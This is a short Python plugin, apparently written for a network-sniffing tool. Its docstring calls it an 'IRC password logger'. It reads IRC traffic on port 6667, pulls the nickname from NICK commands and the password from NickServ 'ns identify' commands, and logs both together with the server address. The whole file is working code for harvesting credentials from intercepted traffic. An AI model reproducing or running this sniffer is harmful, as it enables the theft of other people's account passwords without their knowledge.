import base64
"""IRC password logger"""
PROPERTY={}
PROPERTY['NAME']="IRC Logger"
PROPERTY['DESC']="This logs all the IRC accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=6667
PROPERTY['DPORT']=6667
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd, count

        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:4].lower() == "nick"):
            	user = line[5:]
            elif(line[:11].lower() == "ns identify"):
                passwd = line[12:]
        if (user != None and passwd != None):
                self.logger.addInfo('IRC',self.traffic.dst,user,passwd)
                user = None
                passwd = None
